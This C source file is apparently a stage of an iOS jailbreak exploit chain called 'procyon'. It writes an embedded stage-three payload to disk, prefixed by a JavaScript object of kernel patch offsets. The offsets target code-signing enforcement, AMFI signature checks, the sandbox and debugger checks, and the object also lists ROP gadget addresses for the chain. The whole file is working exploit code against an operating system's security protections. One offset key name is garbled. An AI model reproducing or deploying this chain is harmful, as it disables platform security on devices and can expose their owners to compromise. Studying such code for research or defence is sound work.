#include "util.h"
#include "procyon.h"

int gen_stage3(void) {
    size_t stage3_size = 0;
    void *stage3_data = load_embedded_file("__stage3", &stage3_size);
    if (stage3_data == NULL) {
        print_log(true, "[-] failed to load __stage3 section\n");
        return -1;
    }

    unlink("/var/root/procyon/stage3.bin");
    int fd = open("/var/root/procyon/stage3.bin", O_RDWR|O_CREAT, 0777);
    if (fd < 0) {
        print_log(true, "[-] failed to create /var/root/procyon/stage3.bin\n");
        return -1;
    }
    
    ftruncate(fd, 0x20000);
    lseek(fd, 0, SEEK_SET);

    char *info_buf = calloc(1, 0x4000);
    snprintf(info_buf, 0x4000-1, 
        "var info = {\n \
            remap_base: 0x%x,\n \
            symbols: {\n \
                dlopen: 0x%x,\n \
                dlsym: 0x%x,\n \
                mach_msg_trap: 0x%x \n \
            },\n \
            patches: {\n \
                proc_enforce: 0x%x,\n \
                ret1_gadget: 0x%x,\n \
                pid_check: 0x%x,\n \
                locked_task: 0x%x,\n \
                i_can_has_debugger_1: 0x%x,\n \
                i_can_has_debugger_2: 0x%x,\n \
                mount_patch: 0x%x,\n \
                vm_map_enter: 0x%x,\n \
                pid_cvm_map_protectheck: 0x%x,\n \
                vm_fault_enter: 0x%x,\n \
                csops_patch: 0x%x,\n \
                csops_patch_size: 0x%x,\n \
                amfi_cred_label_update_execve: 0x%x,\n \
                amfi_vnode_check_signature: 0x%x,\n \
                amfi_loadEntitlementsFromVnode: 0x%x,\n \
                amfi_vnode_check_exec: 0x%x,\n \
                mapForIO: 0x%x,\n \
                sbcall_debugger: 0x%x,\n \
                vfsContextCurrent: 0x%x,\n \
                vnodeGetattr: 0x%x,\n \
                kernelConfig_stub: 0x%x,\n \
                sb_ops: 0x%x,\n \
                sb_disable: 0x%x,\n \
                sb_disable_size: 0x%x,\n \
                cs_system_require_lv: 0x%x,\n \
                amfi_cs_flags_patch: 0x%x\n \
            },\n \
            gadgets: {\n \
                js_proto_lr: 0x%x,\n \
                ldm_r1_r3_r5_r10_r11_r12_lr_pc: 0x%x,\n \
                ldm_r5_r0_r2_r4_r5_r8_r11_r12_pc: 0x%x,\n \
                ldm_r3_r1_r3_r9_r10_pc: 0x%x,\n \
                svc_0x80_bx_lr: 0x%x\n \
            },\n \
            version: [%d, %d, %d],\n \
            use_dhcpd: %d,\n \
            unsafe_slide: %d\n \
        }\n\n\n\n",
        procyon->dsc.remap_base,
        procyon->symbols.dlopen,
        procyon->symbols.dlsym,
        procyon->symbols.mach_msg_trap,
        procyon->offsets.kernel.proc_enforce,
        procyon->offsets.kernel.ret1_gadget,
        procyon->offsets.kernel.pid_check,
        procyon->offsets.kernel.locked_task,
        procyon->offsets.kernel.i_can_has_debugger_1,
        procyon->offsets.kernel.i_can_has_debugger_2,
        procyon->offsets.kernel.mount_patch,
        procyon->offsets.kernel.vm_map_enter,
        procyon->offsets.kernel.vm_map_protect,
        procyon->offsets.kernel.vm_fault_enter,
        procyon->offsets.kernel.csops_patch,
        procyon->offsets.kernel.csops_patch_size,
        procyon->offsets.kernel.amfi_cred_label_update_execve,
        procyon->offsets.kernel.amfi_vnode_check_signature,
        procyon->offsets.kernel.amfi_loadEntitlementsFromVnode,
        procyon->offsets.kernel.amfi_vnode_check_exec,
        procyon->offsets.kernel.mapForIO,
        procyon->offsets.kernel.sbcall_debugger,
        procyon->offsets.kernel.vfsContextCurrent,
        procyon->offsets.kernel.vnodeGetattr,
        procyon->offsets.kernel.kernelConfig_stub,
        procyon->offsets.kernel.sb_ops,
        procyon->offsets.kernel.sb_disable,
        procyon->offsets.kernel.sb_disable_size,
        procyon->offsets.kernel.cs_system_require_lv,
        procyon->offsets.kernel.amfi_cs_flags_patch,
        procyon->gadgets.js_proto_lr,
        procyon->gadgets.ldm_r1_r3_r5_r10_r11_r12_lr_pc,
        procyon->gadgets.ldm_r5_r0_r2_r4_r5_r8_r11_r12_pc,
        procyon->gadgets.ldm_r3_r1_r3_r9_r10_pc,
        procyon->gadgets.svc_0x80_bx_lr,
        procyon->ios_version[0],
        procyon->ios_version[1],
        procyon->ios_version[2],
        procyon->use_dhcpd,
        procyon->unsafe_slide
    );

    size_t info_size = strlen(info_buf);
    write(fd, info_buf, info_size);
    free(info_buf);

    write(fd, stage3_data, stage3_size);
    fcntl(fd, F_FULLFSYNC);
    close(fd);
    return 0;
}
